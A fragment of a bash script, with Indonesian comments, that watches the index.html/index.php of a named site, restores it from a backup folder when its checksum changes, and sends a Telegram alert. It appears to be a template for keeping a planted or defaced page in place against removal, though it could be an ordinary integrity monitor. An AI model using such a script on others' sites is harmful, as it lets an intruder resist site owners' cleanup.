...
INDEX_FILE="/var/www/u0453969/data/www/autoprogress-m.ru/index.html"
INDEX_FILE="/var/www/u0453969/data/www/autoprogress-m.ru/index.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/var/www/u0453969/data/www/autoprogress-m.ru/lib"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            send_telegram_notification "index.htm/index.php di hapus.  DI KEMBALIKAN." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
